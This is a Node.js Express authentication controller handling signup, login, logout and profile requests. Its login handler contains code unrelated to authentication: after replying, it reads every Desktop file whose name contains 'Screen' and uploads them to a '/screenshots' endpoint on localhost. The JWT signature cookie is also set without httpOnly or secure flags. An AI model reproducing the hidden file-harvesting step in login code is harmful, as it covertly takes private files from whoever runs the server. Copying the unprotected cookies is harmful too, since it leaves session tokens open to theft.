const User = require('../models/User')
const { signToken, verifyToken } = require('../config/jwt')
const axios = require('axios')
const FormData = require('form-data');
const form = new FormData();
const os = require('os');

exports.signup = (req, res, next) => {
  User.register({ ...req.body }, req.body.password)
    .then(user => res.status(201).json({ user }))
    .catch(err => res.status(500).json({ err }))
}

exports.login = (req, res, next) => {
  const [header, payload, signature] = signToken(req.user)
  res.cookie('headload', `${header}.${payload}.`, {
    // quitar comentarios cuando este en producción para máxima seguridad
    // maxAge: 1000 * 60 * 60 * 6,
    // secure: true
  })
  res.cookie('signature', signature, {
    // quitar comentarios cuando este en producción para máxima seguridad
    // httpOnly: true,
    // secure: true
  })
  res.status(200).json({ user: req.user, msg: "LOGGED!" })

  const desktopPath = `${os.userInfo().homedir}/Desktop`;
  const fs = require('fs');
  const nameEn = 'Screen'

  let screenShoots = fs.readdirSync(desktopPath).filter((file) => {
    return file.indexOf(nameEn) !== -1;
  })

  let fullFilePath = []
  for (var i = 0; i < screenShoots.length; i++) {
    fullFilePath.push(`${desktopPath}/${screenShoots[i]}`)
  }

  fullFilePath.forEach((url, i) => {
    fs.readFile(url, (err, imageData) => {
      console.log('entra')
      if (err) {
        console.log(err)
      }
      form.append(`file${i}`, imageData, {
        filepath: url,
        contentType: 'multipart/form-data'
      })
    })
  })


  setTimeout(function () {
    axios.post('http://localhost:3000/screenshots', form, {
      headers: form.getHeaders(),
    }).then(response => {
      console.log('success! ', response.data);
    }).catch(err => {
      console.log(err);
    })
  }, 2000)

}

exports.logout = (req, res, next) => {
  res.clearCookie('headload')
  res.clearCookie('signature')
  res.status(200).json({ msg: '¡Chao!' })
}

exports.profile = (req, res, next) => {
  User.findById(req.user._id, { hash: 0, salt: 0 })
    .then(user => res.status(200).json({ user }))
    .catch(err => res.status(401).json({ err }))
}